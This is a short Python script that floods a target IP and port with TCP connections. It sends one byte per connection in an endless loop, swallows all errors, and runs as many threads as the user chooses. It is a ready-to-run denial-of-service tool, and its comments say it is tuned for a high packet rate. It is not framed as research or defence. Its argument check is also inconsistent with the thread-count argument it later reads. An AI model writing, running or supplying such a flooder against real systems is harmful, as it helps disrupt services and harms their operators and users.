import socket
import sys
from threading import Thread

if len(sys.argv) < 3: #making sure all arguments are applied
  sys.exit(f"Syntax: python3 {sys.argv[0]} (ip) (port)")

def send():
  while True: #while True loop so that the program doesn't stop
    try:
      s = socket.socket()
      s.connect((sys.argv[1], int(sys.argv[2])))
      s.send(b'.') #yes this payload isn't going to bypass anything, but it is a payload with a smaller byte size so it ouputs a high packets per second, however simple tcp rate limiting will patch this
    except: #excepting an exception and passing it so that the program doesn't stop
      pass

for i in range(int(sys.argv[3])):
  Thread(target=send).start() #starting the threads
